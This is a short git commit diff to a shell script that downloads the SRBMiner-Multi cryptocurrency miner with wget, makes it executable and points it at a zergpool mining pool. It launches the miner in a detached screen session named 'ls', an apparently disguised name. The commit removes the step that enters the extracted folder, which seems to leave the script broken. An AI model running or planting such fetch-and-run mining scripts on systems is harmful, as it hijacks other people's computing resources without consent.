eda0b90c917ec0623717b5bddbaf422c65149081
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-15 10:57:51 +0100

    Update bbt.sh

--- bbt.sh
+++ bbt.sh
@@ -2,7 +2,6 @@ apt install screen
 
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.6/SRBMiner-Multi-0-7-6-Linux.tar.xz
 tar -xvf SRBMiner-Multi-0-7-6-Linux.tar.xz
-cd SRBMiner-Multi-0-7-6
 chmod +x SRBMiner-Multi
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
